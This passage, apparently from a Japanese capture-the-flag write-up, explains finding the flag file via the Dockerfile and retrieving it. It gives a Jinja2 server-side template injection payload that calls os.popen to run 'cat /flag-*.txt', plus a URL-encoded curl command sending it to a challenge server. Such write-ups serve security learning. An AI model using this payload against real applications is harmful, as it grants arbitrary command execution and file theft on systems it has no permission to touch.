Dockerfileを確認すると、flagは`/flag-*.txt`、つまりルートディレクトリにあることがわかります。実際のファイル名にはMD5のハッシュ値が付いていますが、`*`はワイルドカードで、任意の文字列にマッチするので問題ありません。

したがって、以下のペイロードを使用してフラグを取得できます。

```
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag-*.txt').read() }}
```

cURLコマンドの例は以下です。事前にURLエンコードする必要があります。

```bash
curl 'http://34.170.146.252:14677/roll?username=%7B%7B%20config.__class__.__init__.__globals__%5B%27os%27%5D.popen(%27cat%20%2Fflag-*.txt%27).read()%20%7D%7D'
```